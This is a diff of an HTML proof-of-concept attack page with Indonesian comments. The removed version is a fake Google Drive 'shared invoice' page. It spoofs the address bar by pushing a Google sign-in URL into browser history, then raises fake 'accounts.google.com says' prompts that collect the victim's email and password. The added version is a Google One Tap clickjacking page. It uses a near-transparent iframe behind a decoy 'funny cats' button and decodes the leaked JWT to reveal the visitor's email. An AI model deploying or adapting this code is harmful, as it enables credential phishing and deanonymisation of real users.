@@ -1,81 +1,48 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Google Drive - Shared Document</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; overflow: hidden; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); text-align: center; border: 1px solid #dadce0; width: 380px; transition: 0.3s; }
-        .google-logo { width: 75px; margin-bottom: 20px; }
-        .btn-link { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 18px; cursor: pointer; }
-        #captured-screen { display: none; background: #202124; color: white; height: 100vh; width: 100vw; flex-direction: column; justify-content: center; align-items: center; position: absolute; z-index: 100; }
-    </style>
+    <title>Clickjacking PoC</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
 </head>
-<body>
+<body class="p-5">
+    <h1>Google One Tap Clickjacking Proof of Concept</h1>
+    <p class="text-muted">Status: <span id="status" class="badge bg-warning">Waiting for Hover</span></p>
 
-    <div id="captured-screen">
-        <h1 style="color: #8ab4f8; font-size: 48px; margin-bottom: 10px;">CAPTURED</h1>
-        <div style="background: #303134; padding: 30px; border-radius: 12px; text-align: left; min-width: 300px; border: 1px solid #5f6368;">
-            <p style="font-size: 18px;"><strong>Email:</strong> <span id="res-email" style="color: #8ab4f8;"></span></p>
-            <p style="font-size: 18px;"><strong>Password:</strong> <span id="res-pass" style="color: #f28b82;"></span></p>
-        </div>
-        <button onclick="location.reload()" style="margin-top: 30px; padding: 10px 20px; cursor: pointer; border-radius: 4px; border: none;">Reset PoC</button>
-    </div>
+    <iframe id="target-frame" onmouseover="attack()" 
+            style="border: 1px solid black; width: 500px; height: 300px;"></iframe>
 
-    <div id="portal" class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="60">
-        <h2 style="margin-top: 15px;">Shared Document</h2>
-        <p style="color: #5f6368;">File "Invoice_Private.pdf" telah dibagikan kepada Anda.</p>
-        <a href="https://myaccount.google.com/security" target="_blank" rel="opener" 
-           id="trigger" class="btn-link">
-           Buka Invoice_Private.pdf
-        </a>
-        <p style="font-size: 11px; color: #70757a; margin-top: 25px;">Klik kanan > Open link in split window</p>
-    </div>
+    <button class="btn btn-primary" style="position: absolute; top: 150px; left: 80px; z-index: -1;">
+        Click me to see funny cats 🐱
+    </button>
+
+    <div id="res" class="mt-4"></div>
 
     <script>
-        // URL GOOGLE PANJANG YANG LO MINTA
-        const LONG_URL = "https://accounts.google.com/v3/signin/challenge/pwd?TL=AIgtPP3JGfyuYe_VJEwmk59OFxWycwyHoL87w6c42Ien5vfuhRi5YB29oHlJnYlG&authuser=0&cid=2&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword%3Fcontinue%3Dhttps%3A%2F%2Fmyaccount.google.com%2Fsecurity&dsh=S1948665486%3A1775557523511027&flowName=GlifWebSignIn&hl=id&kdi=CAM&rart=ANgoxcfxyF36n393-mFJi1-Y8WIF65Y22K6-UGJXgiA9KCW52x7wunFNAT71ehyXgwrR0JXyMHCG4Bui2BFpka_JgfLR21aqAfelMwvFY1kCbzscdR53Iio&rpbg=1&sarp=1&scc=1&service=accountsettings";
-
-        function lockURL() {
-            try {
-                // Hammering history agar address bar penuh
-                for(let i=0; i<15; i++) {
-                    window.history.pushState(null, null, LONG_URL + "&v=" + Math.random().toString(36).substring(7));
-                }
-                window.history.replaceState(null, null, LONG_URL);
-            } catch(e) {}
+        function attack() {
+            const frame = document.getElementById("target-frame");
+            document.getElementById("status").innerText = "Attacking...";
+            
+            // Masukkan URL Google One Tap target
+            frame.src = "https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html";
+            
+            // Teknik Multi-Shot (Mencoba berbagai delay untuk mencari celah race condition)
+            [200, 300, 400, 500].forEach(ms => {
+                setTimeout(() => {
+                    frame.style.opacity = '0.05'; 
+                    console.log("Opacity set to 0.05 at " + ms + "ms");
+                }, ms);
+            });
         }
 
-        // Trik Utama: Panggil prompt saat fokus hilang (user pindah ke jendela split)
-        window.onblur = function() {
-            // Delay dikit biar jendela split-nya bener-bener kebuka dulu
-            setTimeout(() => {
-                lockURL(); // Kunci URL tepat sebelum prompt muncul
-                
-                // Prompt Sinkron: Membekukan thread browser sehingga URL tidak bisa revert
-                let email = prompt("accounts.google.com says\n\nSign in to continue\n\nEmail or phone");
-                if (email) {
-                    let pass = prompt("accounts.google.com says\n\nEnter your password");
-                    if (pass) {
-                        showCaptured(email, pass);
-                    }
-                }
-            }, 600);
+        // Listener untuk menangkap data JWT yang bocor
+        window.onmessage = (e) => {
+            if (e.data && e.data.credential) {
+                const payload = JSON.parse(atob(e.data.credential.split('.')[1]));
+                document.getElementById('res').innerHTML = 
+                    `<div class="alert alert-success">Berhasil Deanonymized: ${payload.email}</div>`;
+            }
         };
-
-        function showCaptured(e, p) {
-            document.getElementById('portal').style.display = 'none';
-            document.getElementById('captured-screen').style.display = 'flex';
-            document.getElementById('res-email').innerText = e;
-            document.getElementById('res-pass').innerText = p;
-            document.title = "EXPLOIT SUCCESS";
-        }
-
-        // Matikan klik kanan kecuali di link pancingan
-        document.addEventListener('contextmenu', e => {
-            if (e.target.id !== 'trigger') e.preventDefault();
-        });
     </script>
 </body>
 </html>
